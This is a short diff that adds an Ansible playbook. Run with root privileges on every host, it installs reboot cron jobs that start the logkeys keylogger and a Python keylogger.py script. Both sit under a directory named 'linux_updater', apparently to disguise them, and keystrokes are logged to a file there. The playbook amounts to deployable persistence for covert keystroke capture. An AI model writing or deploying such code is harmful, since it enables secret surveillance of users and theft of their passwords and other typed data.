@@ -1,0 +1,17 @@
+#use to start on boot
+---
+- name: Run all scripts on boot (hopefully)
+  hosts: all
+  become: yes
+  tasks:
+    - name: toadd
+      cron:
+        name: logkeys
+        special_time: reboot
+        job: logkeys --start --output /etc/linux_updater/logkeys.log --us-keymap
+    - name: toadd
+      cron:
+        name: keylog
+        special_time: reboot
+        job: nohup /etc/linux_updater/venv/bin/python3 /etc/linux_updater/linux/keylogger.py
+        
